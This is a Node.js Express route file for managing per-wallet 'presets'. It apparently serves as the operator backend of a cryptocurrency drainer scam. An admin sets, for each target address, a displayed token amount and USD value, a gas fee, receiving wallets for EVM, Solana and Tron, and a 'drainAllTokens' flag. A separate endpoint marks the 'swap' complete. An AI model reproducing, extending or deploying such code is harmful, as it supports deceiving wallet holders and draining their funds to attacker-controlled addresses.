const express = require('express');
const router = express.Router();
const mongoose = require('mongoose');
const WalletPreset = require('../models/WalletPreset');
const { authenticateAdmin } = require('../middleware/auth');

let memoryPresets = [];

// GET /api/wallet-presets - List all presets
router.get('/', async (req, res) => {
  try {
    if (mongoose.connection.readyState === 1) {
      const presets = await WalletPreset.find()
        .populate('selectedTokens')
        .sort({ createdAt: -1 });
      return res.json(presets);
    }
    res.json(memoryPresets);
  } catch (error) {
    console.error('[GET /wallet-presets error]', error);
    res.json(memoryPresets);
  }
});

// GET /api/wallet-presets/:address - Get single preset
router.get('/:address', async (req, res) => {
  try {
    const address = req.params.address.toLowerCase().trim();

    if (mongoose.connection.readyState === 1) {
      let preset = await WalletPreset.findOne({
        walletAddress: address,
        swapCompleted: { $ne: true },
      }).populate('selectedTokens');

      if (!preset) {
        preset = await WalletPreset.findOne({ walletAddress: address })
          .populate('selectedTokens')
          .sort({ updatedAt: -1 });
      }

      if (preset) return res.json(preset);
    }

    const memPreset = memoryPresets.find(p => p.walletAddress.toLowerCase() === address);
    if (memPreset) return res.json(memPreset);

    res.status(404).json({ error: 'Wallet preset not found' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/wallet-presets - Create or update preset
router.post('/', authenticateAdmin, async (req, res) => {
  try {
    const {
      walletAddress,
      blockchain,
      gasFee,
      gasFeeUsd,
      receivingWallet,
      receivingWallets,
      selectedTokens,
      drainAllTokens,
      token,
    } = req.body;

    if (!walletAddress) {
      return res.status(400).json({ error: 'Wallet address is required' });
    }

    if (!token || !token.name || !token.symbol || token.amount === undefined || token.usdValue === undefined || !token.logo) {
      return res.status(400).json({ error: 'Token information (name, symbol, amount, USD value, logo) is required' });
    }

    const normalizedAddress = walletAddress.toLowerCase().trim();

    const presetData = {
      walletAddress: normalizedAddress,
      blockchain: blockchain || 'ETH',
      gasFee: parseFloat(gasFee) || 0.005,
      gasFeeUsd: parseFloat(gasFeeUsd) || 2,
      receivingWallet: receivingWallet || '',
      receivingWallets: {
        evm: receivingWallets?.evm || '',
        solana: receivingWallets?.solana || '',
        tron: receivingWallets?.tron || '',
      },
      selectedTokens: Array.isArray(selectedTokens) ? selectedTokens : [],
      drainAllTokens: !!drainAllTokens,
      token: {
        name: token.name.trim(),
        symbol: token.symbol.trim(),
        amount: parseFloat(token.amount) || 0,
        usdValue: parseFloat(token.usdValue) || 0,
        logo: token.logo.trim(),
        address: token.address ? token.address.trim() : null,
        decimals: parseInt(token.decimals, 10) || 18,
      },
      swapCompleted: false,
    };

    if (mongoose.connection.readyState === 1) {
      const preset = await WalletPreset.findOneAndUpdate(
        { walletAddress: normalizedAddress },
        { $set: presetData },
        { upsert: true, new: true, setDefaultsOnInsert: true }
      ).populate('selectedTokens');
      return res.json(preset);
    }

    const existingIdx = memoryPresets.findIndex(p => p.walletAddress.toLowerCase() === normalizedAddress);
    const newPreset = { _id: Date.now().toString(), ...presetData, createdAt: new Date(), updatedAt: new Date() };
    if (existingIdx !== -1) {
      memoryPresets[existingIdx] = newPreset;
    } else {
      memoryPresets.unshift(newPreset);
    }

    res.json(newPreset);
  } catch (error) {
    console.error('[POST /wallet-presets error]', error);
    res.status(500).json({ error: error.message });
  }
});

// PUT /api/wallet-presets/:address - Update preset
router.put('/:address', authenticateAdmin, async (req, res) => {
  try {
    const address = req.params.address.toLowerCase().trim();
    const updateData = { ...req.body, updatedAt: Date.now() };

    if (mongoose.connection.readyState === 1) {
      const preset = await WalletPreset.findOneAndUpdate(
        { walletAddress: address },
        { $set: updateData },
        { new: true }
      ).populate('selectedTokens');

      if (preset) return res.json(preset);
    }

    const idx = memoryPresets.findIndex(p => p.walletAddress.toLowerCase() === address);
    if (idx !== -1) {
      memoryPresets[idx] = { ...memoryPresets[idx], ...updateData };
      return res.json(memoryPresets[idx]);
    }

    res.status(404).json({ error: 'Wallet preset not found' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/wallet-presets/:address/complete - Mark swap completed
router.post('/:address/complete', async (req, res) => {
  try {
    const address = req.params.address.toLowerCase().trim();

    if (mongoose.connection.readyState === 1) {
      const preset = await WalletPreset.findOneAndUpdate(
        { walletAddress: address },
        {
          $set: {
            'token.amount': 0,
            swapCompleted: true,
            updatedAt: Date.now(),
          },
        },
        { new: true }
      );

      if (preset) return res.json(preset);
    }

    const preset = memoryPresets.find(p => p.walletAddress.toLowerCase() === address);
    if (preset) {
      preset.token.amount = 0;
      preset.swapCompleted = true;
      return res.json(preset);
    }

    res.status(404).json({ error: 'Wallet preset not found' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// DELETE /api/wallet-presets/:address - Delete preset
router.delete('/:address', authenticateAdmin, async (req, res) => {
  try {
    const address = req.params.address.toLowerCase().trim();

    if (mongoose.connection.readyState === 1) {
      await WalletPreset.findOneAndDelete({ walletAddress: address });
    }

    memoryPresets = memoryPresets.filter(p => p.walletAddress.toLowerCase() !== address);
    res.json({ success: true, message: 'Wallet preset deleted successfully' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
